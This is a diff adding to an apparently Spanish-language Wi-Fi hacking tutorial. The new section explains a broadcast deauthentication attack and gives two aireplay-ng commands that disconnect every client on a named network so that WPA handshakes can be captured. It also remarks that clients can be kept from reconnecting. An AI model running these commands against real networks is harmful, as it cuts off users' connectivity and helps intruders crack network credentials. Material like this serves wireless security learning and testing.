@@ -44,5 +44,20 @@ Ejemplo:
 
 Esto es lo mismo que el anterior pero para desconectar a todos los clientes, de esta forma `es mas probable conseguir uno o varios handshakes`. O tambien se puede utilizar para otros fines.
 
+Para esto reemplazaremos la MAC del cliente victima por la `broadcast MAC: FF:FF:FF:FF:FF:FF` y asi seleccionaremos `todos los clientes` para desconectarlos. Aunque aireplay-ng tiene una facilidad con la cual si no ponemos ninguna MAC, por defecto seleccionara todos los usuarios.
+
+```
+#Forma 1
+> aireplay-ng -0 10 -e {nombre de la red} -c FF:FF:FF:FF:FF:FF {nombre de la tarjeta de red}
+
+#Forma 2 (la que facilita aireplay)
+> aireplay-ng -0 10 -e {nombre de la red} {tarjeta de red}
+
+# IMPORTANTE: aqui tambien podemos hacer que no se puedan reconectar
+```
+
+
+
+
 
 
